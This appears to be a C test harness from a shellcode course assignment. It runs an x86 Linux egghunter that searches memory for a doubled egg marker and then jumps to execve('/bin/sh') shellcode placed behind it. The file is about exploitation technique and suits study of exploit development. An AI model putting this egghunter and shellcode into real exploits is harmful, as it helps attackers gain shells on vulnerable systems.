/*
* 	Author: John Stigerwalt
* 	SLAE: Assignment #3
* 	Website: slae.whiteknightlabs.com/wordpress
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#define EGG "\x91\x50\x90\x50"
// 0x50905091 
 
unsigned char egg[] = EGG;
 
unsigned char egghunter[] = \
"\x89\xe0\xbb\x91\x50\x90\x50\x40\x39\x18\x75\xfb\x39\x58\x04\x75\xf6\xff\xe0";
 
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
main()
{
	printf("Egghunter Length:  %d\n", sizeof(egghunter) - 1);
        printf("Egg shellcode Length:  %d\n", strlen(shellcode));
	
	char stack[200];
	printf("Memory location of shellcode: %p\n", stack);
 
	strcpy(stack, egg);
	strcpy(stack+4, egg);
	strcpy(stack+8, shellcode);
 
	int (*ret)() = (int(*)())egghunter;
	ret();
}
